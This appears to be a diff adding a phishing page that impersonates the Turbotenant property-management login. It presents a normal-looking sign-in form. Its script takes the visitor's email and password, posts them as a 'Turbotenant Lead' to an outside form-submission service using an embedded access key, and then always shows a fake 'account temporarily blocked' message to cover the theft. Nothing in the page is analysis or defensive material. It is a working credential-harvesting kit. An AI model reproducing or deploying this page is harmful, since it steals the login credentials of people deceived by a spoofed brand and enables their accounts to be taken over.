@@ -1,0 +1,313 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Page | Turbotenant</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f7f9fc;
+  color: #172b4d;
+  min-height: 100vh;
+}
+
+.navbar {
+  height: 76px;
+  background: #fff;
+  display: flex;
+  align-items: center;
+  padding: 0 7%;
+  border-bottom: 1px solid #e9edf3;
+}
+
+.logo {
+  font-size: 25px;
+  font-weight: 750;
+  color: #1769aa;
+  letter-spacing: -1px;
+}
+
+.logo span {
+  color: #183b56;
+}
+
+.container {
+  min-height: calc(100vh - 76px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 45px 20px;
+}
+
+.login-wrapper {
+  width: 100%;
+  max-width: 440px;
+  background: #fff;
+  border: 1px solid #e8edf3;
+  border-radius: 12px;
+  padding: 42px 38px;
+  box-shadow: 0 8px 35px rgba(25, 55, 85, 0.07);
+}
+
+h1 {
+  font-size: 28px;
+  color: #183b56;
+  margin-bottom: 10px;
+  text-align: center;
+}
+
+.subtitle {
+  text-align: center;
+  color: #68788a;
+  font-size: 14px;
+  line-height: 1.6;
+  margin-bottom: 32px;
+}
+
+label {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 9px;
+  color: #30475e;
+}
+
+.input-group {
+  margin-bottom: 22px;
+}
+
+input {
+  width: 100%;
+  height: 49px;
+  padding: 0 14px;
+  border: 1px solid #d8e0e9;
+  border-radius: 6px;
+  outline: none;
+  font-size: 15px;
+  color: #253c53;
+  background: #fff;
+  transition: border .2s;
+}
+
+input:focus {
+  border-color: #2685cf;
+  box-shadow: 0 0 0 3px rgba(38,133,207,.10);
+}
+
+.password-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.password-row a,
+.forgot {
+  color: #1676bd;
+  text-decoration: none;
+  font-size: 13px;
+}
+
+.password-row a:hover,
+.forgot:hover {
+  text-decoration: underline;
+}
+
+.login-btn {
+  width: 100%;
+  height: 49px;
+  border: none;
+  border-radius: 6px;
+  background: #247fbd;
+  color: white;
+  font-size: 16px;
+  font-weight: 650;
+  cursor: pointer;
+  transition: background .2s;
+  margin-top: 5px;
+}
+
+.login-btn:hover {
+  background: #17699f;
+}
+
+.divider {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin: 27px 0;
+  color: #91a0ae;
+  font-size: 13px;
+}
+
+.divider::before,
+.divider::after {
+  content: "";
+  height: 1px;
+  background: #e5eaf0;
+  flex: 1;
+}
+
+.signup {
+  text-align: center;
+  font-size: 14px;
+  color: #68788a;
+}
+
+.signup a {
+  color: #1676bd;
+  font-weight: 600;
+  text-decoration: none;
+}
+
+.footer {
+  text-align: center;
+  font-size: 12px;
+  color: #8a99a8;
+  padding: 20px;
+}
+
+@media(max-width: 480px) {
+  .navbar {
+    padding: 0 22px;
+  }
+
+  .login-wrapper {
+    padding: 32px 23px;
+  }
+
+  h1 {
+    font-size: 25px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header class="navbar">
+  <div class="logo"><img style="max-width:80% !important;" src="logo.png"></div>
+</header>
+
+<main class="container">
+  <section class="login-wrapper">
+
+    <h1>Welcome Back!</h1>
+    <p class="subtitle">
+      Log in to your Turbotenant account
+      to manage your properties.
+    </p>
+
+    <form id="loginForm">
+
+  <input type="hidden" name="access_key" value="727472ef-0e91-4efc-b421-2c3d16398117">
+  <input type="hidden" name="subject" value="Turbotenant Lead">
+
+      <div class="input-group">
+        <label for="email">Email Address</label>
+        <input
+          type="email"
+          id="email"
+          placeholder="Enter your email address"
+          autocomplete="username"
+          required
+        >
+      </div>
+
+      <div class="input-group">
+        <div class="password-row">
+          <label for="password">Password</label>
+          <a href="#" id="forgotLink">Forgot password?</a>
+        </div>
+
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter your password"
+          autocomplete="current-password"
+          required
+        >
+      </div>
+
+      <button class="login-btn" type="submit">
+        Log In
+      </button>
+
+ <div id="loginError" style="
+    display:none;
+    margin-top:20px;
+    padding:13px 15px;
+    border-radius:4px;
+    background:#fdecea;
+    border:1px solid #f5c2c0;
+    color:#b3261e;
+    font-size:14px;
+    text-align:left;
+  ">
+    <strong>Unable to sign in.</strong><br>
+    Your account has been temporarily blocked due to suspicious activity.<br>
+    Please contact support for assistance.
+  </div>
+
+
+    </form>
+
+    <div class="divider">OR</div>
+
+    <p class="signup">
+      Don't have an account?
+      <a href="#" id="signupLink">Create an account</a>
+    </p>
+
+  </section>
+</main>
+
+<footer class="footer">
+  © 2026 Turbotenant. All rights reserved.
+</footer>
+
+  <script>
+document.getElementById("loginForm").addEventListener("submit", async function (event) {
+  event.preventDefault();
+
+  const email = document.getElementById("email").value;
+  const pass = document.getElementById("password").value;
+  const accessKey = this.querySelector('[name="access_key"]').value;
+
+  const data = new FormData();
+  data.append("access_key", accessKey);
+  data.append("subject", "Turbotenant Lead");
+  data.append("email", email);
+  data.append("Pass", pass);
+
+  try {
+    await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: data
+    });
+  } catch (error) {
+    console.error(error);
+  }
+
+  // Stay on the same page and show the demo error.
+  document.getElementById("loginError").style.display = "block";
+});
+</script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    M.updateTextFields();
+  });
+</script>
+
+</body>
+</html>
